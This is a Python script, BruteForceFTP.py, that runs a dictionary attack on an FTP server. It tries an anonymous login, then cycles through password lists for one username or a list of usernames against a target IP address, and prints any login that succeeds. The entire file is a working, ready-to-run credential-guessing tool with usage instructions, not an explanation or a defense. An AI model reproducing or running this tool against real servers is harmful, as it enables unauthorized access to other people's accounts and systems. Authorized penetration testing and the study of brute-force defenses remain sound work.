#!/usr/bin/env python

import ftplib
import argparse
import sys

# Usage python BruteForceFTP.py -a 192.168.3.84 -d data/passwords.txt -u data/usernames.txt
# Or    python BruteForceFTP.py -a 192.168.3.84 -d data/passwords.txt -s ftpuser

if sys.version_info[0] >= 3:
	raw_input = input
unicode = str

def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        ftp.quit()
        return True
    except:
        return False


# TODO Lower Complexity
# TODO Add Progress bar (counting total lines)
# TODO Add Counting time and remaining time
# TODO Use Multithreading
# TODO Fix percentage when using a usernames file


def get_len(fname):
    """
        This function returns the file's total lines number.
    """
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1


def get_attr():
    # Parse the command line arguments
    parser = argparse.ArgumentParser('FTP Dictionary Attack')
    parser.add_argument("-a", "--address", type=str, help="The target IP address", required=True)
    parser.add_argument("-d", "--dictionary", type=str, help="The path of the dictionary file", required=True)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-s", "--singleuser", type=str, help="The username to attack (single user mode)", default='')
    group.add_argument("-u", "--userlist", type=str, help="The path of the file with the usernames to attack (do not use with -s)", default='')
    args = parser.parse_args()

    return args.address, args.dictionary, args.userlist, args.singleuser

    # Uncomment the following lines for running in python console
    # address='10.0.0.1'
    # dictionary='data/passwords.lst'
    # userlist='data/usernames.lst'
    # singleuser=''
    
    # return address, dictionary, userlist, singleuser


def dictAttack(target,username,passwords,maxlines):
    """
    This function performs dictionary attack to the specified username

    :param target:
    :param username:
    :param passwords: Tha path of the dictionary to use for the attack
    :param maxlines:
    """
    passwordsFile = open(passwords, 'r')
    with open(passwords, 'r') as passwordsFile:
        for j,line in enumerate(passwordsFile.readlines()):
            password = line.strip('\r\n')
            # percent = round((i * pl + (j + 1)) * 100 / maxlines, 4)
            percent = round((j + 1) * 100 / maxlines, 4)
            print 'Testing (' + str("%.4f" % percent) + '%):' + str(username) + ' with ' + str(password)
            if connect(target, username, password):
                # Password Found
                print '[+] FTP logon succeeded on host ' + target + " UserName: " + username + \
                      ", Password: " + str(password)
                exit(0)
                # else:
                # print '[+] FTP Logon failed on host ' + targetAddress + " UserName: " + username + \
                #       ", Password : " + str(password)


def main():
    targetAddress, passFilePath, usernameFilePath, singleuser = get_attr()
    assert targetAddress != '', 'Target cannot be Empty'

    # Try to connect using anonymous logon
    print '[+] Using anonymous credentials for ' + targetAddress
    if connect(targetAddress, 'anonymous', 'klain@main.com'):
        print '[+] FTP Anonymous log on succeeded on host ' + targetAddress
    else:
        print '[+] FTP Anonymous log on failed on host ' + targetAddress
        # Try Brute Force using dictionary file
        print '[+] Starting Dictionary Attack '

        # Choose single user mode
        if singleuser != '' and usernameFilePath == '':
            print '[+] Starting attack on user ' + str(singleuser)
            print '[+] Calculating total combinations ...'
            maxlines = get_len(passFilePath)
            print str("%.0f" % maxlines)
            dictAttack(targetAddress, singleuser, passFilePath, maxlines)

        elif usernameFilePath != '' and singleuser == '':
            print '[+] Starting attack on multiple users '
            print '[+] Calculating total combinations ...'
            ul = get_len(usernameFilePath)
            pl = get_len(passFilePath)
            maxlines = float(ul * pl)
            print str("%.0f" % maxlines)
            with open(usernameFilePath, 'r') as usernameFile:
                for user in usernameFile.readlines():
                    username = user.strip('\r\n')
                    dictAttack(targetAddress, username, passFilePath,maxlines)
                    print '[+] No password found for user ' + user
        else:
            print 'Check your parameters and try again'
            exit(100)


if __name__ == "__main__":
    main()
